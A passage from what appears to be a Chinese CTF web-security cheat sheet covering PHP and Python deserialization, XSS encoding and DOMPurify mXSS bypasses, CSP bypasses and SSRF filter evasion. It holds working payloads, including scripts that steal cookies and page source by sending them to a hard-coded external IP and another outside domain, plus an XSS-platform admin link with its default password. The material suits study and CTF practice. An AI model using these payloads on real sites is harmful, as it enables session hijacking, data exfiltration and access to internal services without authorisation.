<li>反序列化的时候，php根据长度去读取值，所以双引号不会被转译，如下面的例子，它的a的值长度为8，所以php知道从哪里开始&amp;哪里结束，就没必要转移双引号。<br><img src="http://static.zybuluo.com/1160307775/h0si6pyl99969588wkx7bo65/image_1dmq5jh6dt671mc81i4f1idod1t9.png" alt="image_1dmq5jh6dt671mc81i4f1idod1t9.png-202.7kB"></li>
</ul>
<h2 id="代码审计骚操作"><a href="#代码审计骚操作" class="headerlink" title="代码审计骚操作"></a>代码审计骚操作</h2><h3 id="属性值逃逸"><a href="#属性值逃逸" class="headerlink" title="属性值逃逸"></a>属性值逃逸</h3><p>在常识中提到一点就是php识别value的长度来取值，如果定义的长度大于value的真实长度往后面继续填充字符，直到满足长度。</p>
<p>这里就存在一个问题，如果说我们序列化的内容是某一属性的内容，如果有类似于replace的操作改变属性值的长度，攻击者就可以构造出来一个”长度固定”的内容，里面夹杂着pop链，让php反序列在识别内容的时候到pop链的地方终止，而pop链就可以被反序列化。</p>
<p>具体的一个漏洞分析可以看：<a href="https://xz.aliyun.com/t/6521" target="_blank" rel="noopener">Joomla3.4.6-RCE</a></p>
<p>这个漏洞的核心点就是：传入的<code>username</code>包含\0\0\0，在session_start的时候调用read()进行反序列化，因为<code>username</code>的长度不匹配，就会向后继续填充字段。我们在<code>password</code>构造剩余字段长度+pop链。剩余字段长度用来填充<code>username</code>，然后pop链会被反序列化</p>
<h2 id="常见魔法函数"><a href="#常见魔法函数" class="headerlink" title="常见魔法函数"></a>常见魔法函数</h2><p><a href="https://www.anquanke.com/post/id/159206" target="_blank" rel="noopener">https://www.anquanke.com/post/id/159206</a></p>
<h3 id="phar通用"><a href="#phar通用" class="headerlink" title="phar通用"></a>phar通用</h3><p>利用条件：</p>
<ul>
<li>有一个文件上传点，上传白名单的文件，里面是phar序列化的值</li>
<li>能够触发phar的函数，参数要可控</li>
<li>当应用层过滤了phar://时，可以用<code>php://filter/source=phar://xxx</code>绕过</li>
</ul>
<p>能够触发的函数:</p>
<pre><code>fileatime、filectime、file_exists、file_get_contents、file_put_contents、file、filegroup、fopen、fileinode、filemtime、fileowner、fileperms、is_dir、is_executable、is_file、is_link、is_readable、is_writable、is_writeable、parse_ini_file、copy、unlink、stat、readfile、md5_file、filesize</code></pre><p>通用phar文件写法：</p>
<pre><code>&lt;?php 
class someclass{
}

@unlink(&quot;hpdoger.phar&quot;);
$test = new someclass(); // 实例化要用的类，可以给属性赋值
$phar = new Phar(&quot;hpdoger.phar&quot;);

$phar-&gt;startBuffering();
$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); // 增加gif文件头
$phar-&gt;setMetadata($test);
$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;); //添加要压缩的文件
$phar-&gt;stopBuffering();

rename(&quot;hpdoger.phar&quot;,&quot;hpdoger.gif&quot;); //更改后缀名
?&gt;</code></pre><h2 id="Python反序列化"><a href="#Python反序列化" class="headerlink" title="Python反序列化"></a>Python反序列化</h2><h3 id="调用pickle"><a href="#调用pickle" class="headerlink" title="调用pickle"></a>调用pickle</h3><p>序列化</p>
<pre><code>pickle.dump(文件) 
pickle.dumps(字符串)</code></pre><p>反序列化</p>
<pre><code>pickle.load(文件)
pickle.loads(字符串)</code></pre><h3 id="flask低版本session反序列化"><a href="#flask低版本session反序列化" class="headerlink" title="flask低版本session反序列化"></a>flask低版本session反序列化</h3><p>1.5以下版本的flask处理Session使用的是pickle，所以存在反序列化-rce</p>
<h3 id="numpy"><a href="#numpy" class="headerlink" title="numpy"></a>numpy</h3><p>这个函数也存在反序列化漏洞</p>
<h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><p><a href="https://www.smi1e.top/%e4%bb%8ebalsn-ctf-pyshv%e5%ad%a6%e4%b9%a0python%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96/" target="_blank" rel="noopener">从Balsn CTF pyshv学习python反序列化</a></p>
<p><a href="https://www.anquanke.com/post/id/188981#h2-0" target="_blank" rel="noopener">Python pickle 反序列化实例分析</a></p>
<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="常识-1"><a href="#常识-1" class="headerlink" title="常识"></a>常识</h2><h3 id="各种xss标签-属性-poc"><a href="#各种xss标签-属性-poc" class="headerlink" title="各种xss标签/属性-poc"></a>各种xss标签/属性-poc</h3><p><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank" rel="noopener">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a></p>
<h3 id="dom结构"><a href="#dom结构" class="headerlink" title="dom结构"></a>dom结构</h3><p>取url中”#”后面的字符串</p>
<pre><code>document.location.hash.substr(1)</code></pre><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><h4 id="unicode"><a href="#unicode" class="headerlink" title="unicode"></a>unicode</h4><p>javascript支持的unicode格式是:<code>\uxxxx</code>，其中xxxx代表四位16进制数值，通常我们说的<code>a</code>的ascii码为<code>97</code>(10进制表示)，转换成unicode(16进制)就是<code>61</code>，缺位补0，最终的效果就是<code>\u0061</code><br><img src="http://static.zybuluo.com/1160307775/x4sqpwimtex6xuer47ljmui1/image_1dpsb5m4g1tpr1ju810j12q67vi9.png" alt="image_1dpsb5m4g1tpr1ju810j12q67vi9.png-2.8kB"></p>
<p>写一个函数可以转换String-&gt;unicode</p>
<pre><code>function str2unicode(char){
    return &quot;\\u&quot; + char.charCodeAt().toString(16).padStart(4,00)
}

str2unicode(&quot;a&quot;)</code></pre><p>在含有javascript语意的地方可以用unicode绕过某些过滤</p>
<pre><code>eval(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)
=&gt;
eval(&quot;alert(1)&quot;)</code></pre><p>直接在控制台运行<code>\u0061\u006c\u0065\u0072\u0074(1)</code>也一样。es6以后支持使用<code>\u{xxxx}</code>的写法，所以下面两种unicode的表达形式一样:</p>
<pre><code>\u{0061}
\u0061</code></pre><h4 id="html编码"><a href="#html编码" class="headerlink" title="html编码"></a>html编码</h4><p>&amp;#106=&amp;#0000106</p>
<p>有没有’;’都一样，都是html编码。106是ascii编码值，默认编码格式占7位。浏览器接受html编码的时候，会转换为对应的字符。但是对于<code>&lt;、&gt;、#、&amp;、&quot;</code>这些字符，也有相应的html编码，但是浏览器会把它们解释成实体编码的符号再输出，即<code>&amp;#34;</code>转化<code>&amp;quot;</code>再呈现到页面显示为<code>&quot;</code>。</p>
<p>这种情况有时候可以绕过waf，当输出点在Html标签时可以尝试用<code>&amp;#34;</code>，因为是html语境会先进行一次html解码，解释为正常的<code>&quot;</code></p>
<h4 id="utf8-utf16-utf32"><a href="#utf8-utf16-utf32" class="headerlink" title="utf8/utf16/utf32"></a>utf8/utf16/utf32</h4><p>可以绕过xss-auditor，具体看这篇文章：<a href="http://d1iv3.me/2017/08/05/XSS%E4%B8%8E%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81-UTF-7-UTF-8-UTF-16-UTF-32/?nsukey=Eeg77mV0jrAMDctXgPEgMcQdPwI0tpMDjpJrZSh5NdtQwOYv%2FnEgOlImAU92fuuh6dSHidilPty6DWoPn7gvdXd%2FxK5gISZXUuzI8Y6EdZXPEGz9Beg2e%2BNNzDKZ65Lof%2B6eMg9DtcJGKu5ntRRMm6lVhwQZ2QrgGwwnMu%2Bp38SLHYVNrml6aKuFF3sDwR1JnU3%2BcG8MI0VWLfhyzEP14w%3D%3D" target="_blank" rel="noopener">XSS与字符编码(UTF-7, UTF-8, UTF-16, UTF-32</a></p>
<p>生成对应编码的payload如下：</p>
<pre><code>&gt;&gt;&gt; print(quote((&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;).encode(&#39;utf-16&#39;)))
%FF%FE%3C%00s%00c%00r%00i%00p%00t%00%3E%00a%00l%00e%00r%00t%00%28%001%00%29%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00</code></pre><h3 id="svg-amp-style"><a href="#svg-amp-style" class="headerlink" title="svg&amp;style"></a>svg&amp;style</h3><p>在<code>&lt;style&gt;</code>标签中不允许存在子标签(style标签最初的设计理念就不能用来放子标签)，如果存在会被当作text解析，这也就是Chrome的Text模式，如下图所示。</p>
<p><img src="http://static.zybuluo.com/1160307775/1drqlgt54g11k4z1iks7vt39/image_1ds71a2161dc61kknfq01prg8s6m.png" alt="image_1ds71a2161dc61kknfq01prg8s6m.png-36.6kB"></p>
<p>但是在<code>&lt;svg&gt;</code>标签下，若存在子标签<code>&lt;style&gt;</code>，则<code>&lt;style&gt;</code>标签中的子标签是可以被解析为html正常标签的，如下图。原因就是当你在HTML中打开<code>&lt;svg&gt;</code>时，浏览器的解析规则会发生变化，解析规则趋于XML解析而不是HTML解析</p>
<p><img src="http://static.zybuluo.com/1160307775/k3tiztcxhj1txqw12kadolw2/image_1ds71f9af1khd1rl81v3fme812b322.png" alt="image_1ds71f9af1khd1rl81v3fme812b322.png-41kB"></p>
<h4 id="mXSS-突变XSS基础标签"><a href="#mXSS-突变XSS基础标签" class="headerlink" title="mXSS(突变XSS基础标签)"></a>mXSS(突变XSS基础标签)</h4><p><code>&lt;svg&gt;</code>的子标签不能存在<code>&lt;p&gt;</code>，因为<code>&lt;p&gt;</code>是svg的非法标签，如果存在则会被当作同级标签处理。我们拿<code>a</code>和<code>p</code>来作为子标签比较如下<br><img src="http://static.zybuluo.com/1160307775/p1r0b27xj7qcnheu8pe9j6ue/image_1ds76d021te0165h8jjqbb1nf12s.png" alt="image_1ds76d021te0165h8jjqbb1nf12s.png-38.9kB"></p>
<h3 id="innerHTML"><a href="#innerHTML" class="headerlink" title="innerHTML"></a>innerHTML</h3><p>innerHTML跟浏览器的解析规则一样：会自动补全标签</p>
<h3 id="DOMPurify"><a href="#DOMPurify" class="headerlink" title="DOMPurify"></a>DOMPurify</h3><p>DOMPurify是防止XSS的前端库，介绍和用法见:<a href="https://github.com/cure53/DOMPurify" target="_blank" rel="noopener">https://github.com/cure53/DOMPurify</a></p>
<p>默认配置下，DOMPurify允许所有标签(<code>&lt;div&gt;</code>，<code>&lt;svg&gt;</code>，<code>&lt;p&gt;</code>，<code>&lt;style&gt;</code>和<code>&lt;a&gt;</code>)和属性id。所以它不会改变代码中的任何内容。</p>
<p>因此产生了一种bypass方式，利用点：</p>
<ul>
<li>DOMPurify &lt; 2.0.1</li>
<li>页面某处调用两次innerHTML</li>
</ul>
<p>漏洞原理大致意思：<br>我们把xss语句放进id属性里，前面跟上<code>&lt;style&gt;</code>标签，并用<code>&lt;svg&gt;</code>标签作为父标签。利用innerHTML的特性：跳出<code>&lt;svg&gt;</code>，这样<code>style</code>标签就会把后面的内容作为text处理，从而把id里面的<code>&lt;img&gt;</code>标签解析为html，payload如下:</p>
<pre><code>&lt;svg&gt;&lt;/p&gt;&lt;style&gt;&lt;a id=&quot;&lt;/style&gt;&lt;img src=1 onerror=alert(1)&gt;&quot;&gt;</code></pre><p>经过Dumpurify清洗之后，不会有任何变化。然后把这个值进行两次innerHTML赋值，就能弹窗了，流程:</p>
<pre><code>第一次innerHTML =&gt; &lt;svg&gt;&lt;p&gt;&lt;/p&gt;&lt;style&gt;&lt;a id=&quot;&lt;/style&gt;&lt;img src=1 onerror=alert(1)&gt;&quot;&gt;&lt;/a&gt;&lt;/style&gt;&lt;/svg&gt; 

第二次innerHTML =&gt; &lt;svg&gt;&lt;/svg&gt;&lt;p&gt;&lt;/p&gt;&lt;style&gt;&lt;a id=&quot;&lt;/style&gt;&lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot;&gt;&quot;&amp;gt; #跳出svg,成功弹窗</code></pre><p>不懂得可以先一下笔记mXSS，漏洞相关文档:<a href="https://xz.aliyun.com/t/6413" target="_blank" rel="noopener">利用突变XSS绕过DOMPurify 2.0.0</a></p>
<p>第二次innerHTML的时候，svg和p变成了兄弟标签，从而style标签开始text解析模式读到<code>&lt; id=&quot;&quot;</code>，之后就把img标签解析成html了。</p>
<h3 id="DOM-Clobbering-Attack"><a href="#DOM-Clobbering-Attack" class="headerlink" title="DOM Clobbering Attack"></a>DOM Clobbering Attack</h3><p><a href="http://d1iv3.me/2018/04/11/DOM-Clobbering-Attack/" target="_blank" rel="noopener">http://d1iv3.me/2018/04/11/DOM-Clobbering-Attack/</a></p>
<p>id值可以创造window.xxx/全局变量</p>
<pre><code>&lt;img id=&quot;hpdoger&quot;&gt; 等价于 window.hpdoger 等价于 hpdoger</code></pre><p>name值可以创造document.xxx变量</p>
<pre><code>&lt;img name=&quot;hpdoger&quot;&gt; 等价于 document.hpdoger</code></pre><h2 id="各种标签"><a href="#各种标签" class="headerlink" title="各种标签"></a>各种标签</h2><h3 id="js创建标签"><a href="#js创建标签" class="headerlink" title="js创建标签"></a>js创建标签</h3><pre><code>script=document.createElement(&#39;script&#39;);script.src=&#39;//bo0om.ru/csp.js&#39;;document.body.appendChild(script);</code></pre><h3 id="a标签"><a href="#a标签" class="headerlink" title="a标签"></a>a标签</h3><p>可以用autofocus  猫哥给的，感觉不能onload的标签都可以试一下。不过这个需要点击一下才能触发</p>
<pre><code>&lt;a contenteditable onfocus=alert(document.location) autofocus href=&quot;aaa&quot;&gt;aaaaaaaaaaaaa&lt;/a &gt;</code></pre><p>还有一个更骚的，利用锚点自动聚焦触发，只需要在url后面加#1</p>
<pre><code>&lt;a onfocus=&quot;alert(document.cookie)&quot; id=&quot;1&quot; tabindex=&quot;0&quot;&gt;&lt;/a &gt;</code></pre><p><img src="http://static.zybuluo.com/1160307775/ett6l17ebtak7tpieba9qah9/image_1dkpti8oq1ab21r101am733omkc9.png" alt="image_1dkpti8oq1ab21r101am733omkc9.png-45.1kB"></p>
<h3 id="frameset标签"><a href="#frameset标签" class="headerlink" title="frameset标签"></a>frameset标签</h3><pre><code>&lt;frameset onpageshow=alert(1)&gt;</code></pre><h2 id="各种协议"><a href="#各种协议" class="headerlink" title="各种协议"></a>各种协议</h2><h3 id="data"><a href="#data" class="headerlink" title="data"></a>data</h3><p>data:text/html</p>
<p>适用于src属性后面，能解析js语句的函数(例如eval,setTimeout)</p>
<pre><code>data:text/html;base64,xxxx</code></pre><p>注意点：<br>1、xxx即恶意payload的base64编码，用console的btoa来编码payload，不要用其它的base64编码</p>
<p>2、还有一种冷门的用法，执行点在charset，前提是需要定义window.text、window.html、window.base64</p>
<pre><code>eval(&#39;data:text/html;charset=alert(1);base64,whatever&#39;)</code></pre><p>这个用法的例子见:<a href="https://dee-see.github.io/intigriti/xss/2019/05/02/intigriti-xss-challenge-writeup.html" target="_blank" rel="noopener">https://dee-see.github.io/intigriti/xss/2019/05/02/intigriti-xss-challenge-writeup.html</a></p>
<h2 id="XSS平台"><a href="#XSS平台" class="headerlink" title="XSS平台"></a>XSS平台</h2><p>搭建的蓝莲花xss平台：<a href="http://120.79.152.66:8000/admin.php" target="_blank" rel="noopener">http://120.79.152.66:8000/admin.php</a></p>
<p>默认密码:<strong>bluelotus</strong></p>
<p>可以导入模版，然后修改地址为自己的平台url，点击<strong>生成payload</strong>就可以看到js所在路径<br><img src="http://static.zybuluo.com/1160307775/12ow2gpzv3ed0bhcd86pm8ea/image_1diml87oh5dg1iuqed313gu16pc9.png" alt="image_1diml87oh5dg1iuqed313gu16pc9.png-196.5kB"></p>
<p>还可以进行一些编码<br><img src="http://static.zybuluo.com/1160307775/0op7d8bksx2xdqbj6s1xe6ov/image_1diml9qdf1j26gs4knb1tcc9r5m.png" alt="image_1diml9qdf1j26gs4knb1tcc9r5m.png-78.1kB"></p>
<h2 id="打页面源码"><a href="#打页面源码" class="headerlink" title="打页面源码"></a>打页面源码</h2><h3 id="当前页面"><a href="#当前页面" class="headerlink" title="当前页面"></a>当前页面</h3><pre><code>&lt;svg/onload=&quot;document.location=&#39;http://120.79.152.66:8000/?&#39;+btoa(document.body.innerHTML)&quot;&gt;</code></pre><h3 id="其他页面"><a href="#其他页面" class="headerlink" title="其他页面"></a>其他页面</h3><pre><code>&lt;script&gt;
function createXmlHttp() {
    if (window.XMLHttpRequest) {
        xmlHttp = new XMLHttpRequest()
    } else {
        var MSXML = new Array(&#39;MSXML2.XMLHTTP.5.0&#39;, &#39;MSXML2.XMLHTTP.4.0&#39;, &#39;MSXML2.XMLHTTP.3.0&#39;, &#39;MSXML2.XMLHTTP&#39;, &#39;Microsoft.XMLHTTP&#39;);
        for (var n = 0; n &lt; MSXML.length; n++) {
            try {
                xmlHttp = new ActiveXObject(MSXML[n]);
                break
            } catch(e) {}
        }
    }
}
createXmlHttp();
xmlHttp.onreadystatechange = function(){
  if (xmlHttp.readyState == 4) {
        code=escape(xmlHttp.responseText);
        createXmlHttp();
        url = &quot;http://120.79.152.66:8001/?code&quot;;   //这里是我们服务器接受的地址
        cc = &quot;htmlcode=&quot; + code +&quot;&amp;filename=hint.html&quot;;
        xmlHttp.open(&quot;POST&quot;, url, true);
        xmlHttp.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);
        xmlHttp.send(cc)
  }
};
xmlHttp.open(&quot;GET&quot;, &quot;/hint.html&quot;, true);//这块填写获得的后台地址。
xmlHttp.send(null);
&lt;/script&gt;</code></pre><p>还可以使用fetch这个异步请求捕捉页面。</p>
<pre><code>fetch(&#39;/admin.html&#39;).then(x =&gt; x.text()).then(x =&gt; {
    location = &#39;http://rwx.kr/?d=&#39; + btoa(x);
});</code></pre><h2 id="打cookie"><a href="#打cookie" class="headerlink" title="打cookie"></a>打cookie</h2><h3 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h3><pre><code></code></pre><h3 id="window-location"><a href="#window-location" class="headerlink" title="window.location"></a>window.location</h3><pre><code>window.location = &#39;http://120.79.152.66&#39;+document.cookie</code></pre><h3 id="image"><a href="#image" class="headerlink" title="image"></a>image</h3><pre><code>new Image().src=&#39;http://120.79.152.66/flag=&#39;+document.cookie</code></pre><h2 id="XHR请求"><a href="#XHR请求" class="headerlink" title="XHR请求"></a>XHR请求</h2><pre><code>xmlhttp=new XMLHttpRequest();
xmlhttp.onreadystatechange=function()
{
    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)
    {
        document.location=&#39;http://vps_ip:23333/?&#39;+btoa(xmlhttp.responseText);
    }
}
xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);
xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);
xmlhttp.send(&quot;url=xxx&quot;);</code></pre><h2 id="CSP相关"><a href="#CSP相关" class="headerlink" title="CSP相关"></a>CSP相关</h2><h3 id="查询csp缺陷"><a href="#查询csp缺陷" class="headerlink" title="查询csp缺陷"></a>查询csp缺陷</h3><p>复制浏览器返回的csp头，到:<a href="https://csp-evaluator.withgoogle.com/，可以查看当前csp的缺陷(比如，忘了设置什么)" target="_blank" rel="noopener">https://csp-evaluator.withgoogle.com/，可以查看当前csp的缺陷(比如，忘了设置什么)</a><br><img src="http://static.zybuluo.com/1160307775/pcn97h1b3fyb4s0ue8rb01ne/image_1dq9cm5f1k7tdjkukd12vuq99.png" alt="image_1dq9cm5f1k7tdjkukd12vuq99.png-81.3kB"></p>
<h3 id="window-location-1"><a href="#window-location-1" class="headerlink" title="window.location"></a>window.location</h3><p>这个东西可以bypass csp，因为他不属于资源</p>
<pre><code>window.location = &#39;http://120.79.152.66&#39;+document.cookie</code></pre><p>可以看总结：<a href="https://xz.aliyun.com/t/5084" target="_blank" rel="noopener">https://xz.aliyun.com/t/5084</a></p>
<h3 id="csp限制目录bypass"><a href="#csp限制目录bypass" class="headerlink" title="csp限制目录bypass"></a>csp限制目录bypass</h3><p><img src="http://static.zybuluo.com/1160307775/fva575tblvauko4na3f5grzw/image_1dil1li3v1k224l1g3q5cc16v49.png" alt="image_1dil1li3v1k224l1g3q5cc16v49.png-160.9kB"></p>
<p>csp目录限制<code>content=&quot;script-src pastebin.com/XYZ/&quot;</code></p>
<p>但是用这种方法可以跨目录加载到<code>pastebin.com/b0Rajxqk</code>的js文件</p>
<p>具体原理应该是rpo:<a href="https://www.jianshu.com/p/5b174dcba362" target="_blank" rel="noopener">RPO攻击导致的XSS</a></p>
<h3 id="iframe来bypassCSP"><a href="#iframe来bypassCSP" class="headerlink" title="iframe来bypassCSP"></a>iframe来bypassCSP</h3><p>当一个同源站点，同时存在两个页面，其中<strong>一个有CSP保护的A页面</strong>，<strong>另一个没有CSP保护B页面</strong>。</p>
<p>那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom，A页面的CSP防护完全失效<br><img src="http://static.zybuluo.com/1160307775/orcqk8cgbz10far21uvn5zb1/image_1dd8b6jsku4c129k14vflmutk5p.png" alt="image_1dd8b6jsku4c129k14vflmutk5p.png-59.6kB"></p>
<h3 id="Access-control-allow-origin"><a href="#Access-control-allow-origin" class="headerlink" title="Access-control-allow-origin"></a>Access-control-allow-origin</h3><p>当Access-control-allow-origin指定origin的时候，考虑下面一种情况也可以Bypass CSP(CORS的错误配置):</p>
<p>CSP页面<strong>存在缓存记录</strong>且“Access-Control-Allow-Origin”已经被设置，但是“Access-Control-Allow-Credentials: true”并且“Vary: Origin”头没有被设置(或者不存在)</p>
<p>可以利用缓存进行XSS-&gt;加载远程的JS脚本=&gt;bypass CSP<br>具体文章可以看这一篇：<a href="https://xz.aliyun.com/t/2745#toc-18，未来的CTF很可能有这一方面的考点" target="_blank" rel="noopener">https://xz.aliyun.com/t/2745#toc-18，未来的CTF很可能有这一方面的考点</a></p>
<h2 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a>XSS绕过</h2><h3 id="unicode-1"><a href="#unicode-1" class="headerlink" title="unicode"></a>unicode</h3><p>eval的绕过，通过填充\u0028换行分割符、\u2029段落分隔符</p>
<pre><code>eval(&#39;\u2028alert\u2029(1)&#39;)</code></pre><h3 id="浏览器解析"><a href="#浏览器解析" class="headerlink" title="浏览器解析"></a>浏览器解析</h3><h4 id="域名中的点号"><a href="#域名中的点号" class="headerlink" title="域名中的点号"></a>域名中的点号</h4><pre><code>%E3%80%82
=&gt; url解码为: &quot;。&quot; 
=&gt;浏览器会把它解释为 &quot;.&quot; 
=&gt; bypass &quot;.&quot;的限制</code></pre><p>还有一种bypass来绕过window.location.host的判断<br><img src="http://static.zybuluo.com/1160307775/k2e2blpvm3rnuzmxhj4k78ue/image_1dtkt6ll71mmvjuh1bg5egq12bq9.png" alt="image_1dtkt6ll71mmvjuh1bg5egq12bq9.png-12.5kB"></p>
<p>在域名的后面加”.”号就行了，即<code>treasure.npointer.cn.</code>解析到<code>treasure.npointer.cn</code></p>
<p><img src="http://static.zybuluo.com/1160307775/d4bgmtnynalf5wseokjwqbsp/image_1dtkta0tr14jj19pi1shju2n1gg32c.png" alt="image_1dtkta0tr14jj19pi1shju2n1gg32c.png-9.6kB"></p>
<h4 id="突破双引号限制"><a href="#突破双引号限制" class="headerlink" title="突破双引号限制"></a>突破双引号限制</h4><p>如果我们因为某个双引号，js报错的话，可以使用注释的方法，注释最后一个正确双引号后的所有内容。</p>
<p>看hitcon2019的例子，这里我们有三个双引号，但是依然可以跳转到<code>https://hpdoger.cn?document.cookie</code>，原因就是后面的<code>·--&gt;</code>可以注释后面的语句，即注释了后面的双引号。</p>
<p>原理就是–&gt;可以被当作注释符号，但必须有<code>\n</code>和<code>\r</code>来换行，才能注释。<br><img src="http://static.zybuluo.com/1160307775/z3bov0lhmusb9um8n8g690qn/image_1dneipo85gfdao1v301iq170q9.png" alt="image_1dneipo85gfdao1v301iq170q9.png-130.7kB"></p>
<p>这道题目过滤<code>\n</code>或<code>\r</code>，但是ECMA-262标准中，还有其他的换行符<br><img src="https://i.loli.net/2019/10/15/btWyJmw3Q7o4XMO.png" alt></p>
<p>所以unicode中<code>\u{2028}</code>也可用作换行，后端服务器不会解码<code>%E2%80%A8</code>，前端浏览器会把它当作实心点号解析，但其实是换行的标志位。<br><img src="http://static.zybuluo.com/1160307775/bjypn0138ruhused6961m45f/image_1dnej0u2r1ocr1fnc5f71hu81l33m.png" alt="image_1dnej0u2r1ocr1fnc5f71hu81l33m.png-11.1kB"></p>
<p>那么上面的payload最终的形式应该是这样:</p>
<pre><code>https://hpdoger.cn/?&quot;%2beval(atob(`ZG9jdW1lbnQuY29va2ll`))%E2%80%A8--&gt;</code></pre><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="常见题型"><a href="#常见题型" class="headerlink" title="常见题型"></a>常见题型</h2><h3 id="gopher打mysql"><a href="#gopher打mysql" class="headerlink" title="gopher打mysql"></a>gopher打mysql</h3><p>前提是:<br>1、已知mysql的账号密码(大概率通过php文件泄漏的方式)<br>2、存在ssrf</p>
<p>原理都是利用SSRF拿Gopher协议发送构造好的TCP/IP数据包攻击mysql</p>
<p>相关文章：<br><a href="https://yinwc.github.io/2018/07/31/Gopher/" target="_blank" rel="noopener">https://yinwc.github.io/2018/07/31/Gopher/</a><br><a href="https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/#GopherMySQL" target="_blank" rel="noopener">https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/#GopherMySQL</a></p>
<p>不去抓本地包再构造，有一个自动生成poc的工具：<a href="https://github.com/undefinedd/extract0r-" target="_blank" rel="noopener">https://github.com/undefinedd/extract0r-</a></p>
<h2 id="过滤指定字符串"><a href="#过滤指定字符串" class="headerlink" title="过滤指定字符串"></a>过滤指定字符串</h2><p>用unicode编码绕过localhost的限制</p>
<pre><code>LocalHost = localhost = ⓛocaⓛhost </code></pre><h2 id="常见绕过"><a href="#常见绕过" class="headerlink" title="常见绕过"></a>常见绕过</h2><h3 id="host白名单"><a href="#host白名单" class="headerlink" title="host白名单"></a>host白名单</h3><p>检测host是不是含有白名单如<code>baidu.com</code>，可以用两种方法：</p>
<p>1、data://协议，php不关心MIME类型，所以可以把baidu.com放到MIME类型里</p>
<pre><code>data://baidu.com/plain;base64,xxxxxx</code></pre><p>xxx是我们想让服务器解析的明文字符串，以base64的方式编码</p>
<p>2、orange的思路</p>
<pre><code>http://foo@127.0.0.1:80@baidu.com/flag.php</code></pre><p>curl请求的是127.0.0.1，而baidu.com是题目的白名单</p>
<h3 id="指定后缀名绕过-仅限于curl产生的ssrf"><a href="#指定后缀名绕过-仅限于curl产生的ssrf" class="headerlink" title="指定后缀名绕过(仅限于curl产生的ssrf)"></a>指定后缀名绕过(仅限于curl产生的ssrf)</h3><p>例如下面这种情况，指定必须为jpg后缀时，可以用<code>file:///flag.php?.jpg</code>也可以读到<code>/flag.php</code>文件，详情见文章:<a href="https://xz.aliyun.com/t/7112" target="_blank" rel="noopener">浅析SSRF与文件读取的一些小特性</a></p>
<pre><code>&lt;?php
var_dump(ini_get(&#39;allow_url_fopen&#39;));
$url = $_POST[&#39;url&#39;];
$url = $url . &#39;.jpg&#39;;
var_dump($url);

if(function_exists(&#39;curl_init&#39;) &amp;&amp; function_exists(&#39;curl_exec&#39;)){
    $ch = curl_init($url);
    $data = &#39;&#39;;
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $data = curl_exec($ch);
    curl_close($ch);
    var_dump($data);
}
?&gt;</code></pre><h2 id="IP地址转换绕过"><a href="#IP地址转换绕过" class="headerlink" title="IP地址转换绕过"></a>IP地址转换绕过</h2><h3 id="常规的思路"><a href="#常规的思路" class="headerlink" title="常规的思路"></a>常规的思路</h3><p>数字地址(十进制)：127.0.0.1-&gt;2130706433<br>十六进制：127.0.0.1-&gt;0x7F000001或0x7F.00.00.01或0x7F.0x00.0x00.0x01<br>八进制： 127.0.0.1-&gt;0177.0.0.1或0177.00.00.01<br>省略写法：127.0.0.1-&gt;127.1</p>
<p>或者利用xio.io</p>
<pre><code>127.0.0.1.xip.io
www.127.0.0.1.xip.io
xxx.127.0.0.1.xip.io
fuzz.xxx.127.0.0.1.xip.io</code></pre><h3 id="骚姿势"><a href="#骚姿势" class="headerlink" title="骚姿势"></a>骚姿势</h3><p>之前在吐司学的一招实战用：如果302跳转(准确的说是http协议)禁用IPV4的规则传入，可以用IPV6绕过：</p>
<pre><code>http://[::ffff:127.0.0.1]/
也可以缩写成 http://[::1]/</code></pre><h2 id="check内网ip段绕过"><a href="#check内网ip段绕过" class="headerlink" title="check内网ip段绕过"></a>check内网ip段绕过</h2><p>php过滤代码如下</p>
<pre><code>    $hostname=$url_parse[&#39;host&#39;]; 
    $ip=gethostbyname($hostname); 
    $int_ip=ip2long($ip);
    return ip2long(&#39;127.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;10.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;172.16.0.0&#39;)&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long(&#39;192.168.0.0&#39;)&gt;&gt;16 == $int_ip&gt;&gt;16; </code></pre><p>用ip2long和parse_url来check请求是否包含内网ip段，则可以用以下方法绕过</p>
<pre><code>1. http://0.0.0.0/flag.php
2. http://foo@127.0.0.1:80@baidu.com/flag.php
3. http://%5B::%5D:22/</code></pre><p>第一种是对于0.0.0.0掩码绕过<br>第二种白名单是baidu.com，黑名单是127x网段<br>第三种是绕过主机名探测，用[::]替代127.0.0.1</p>
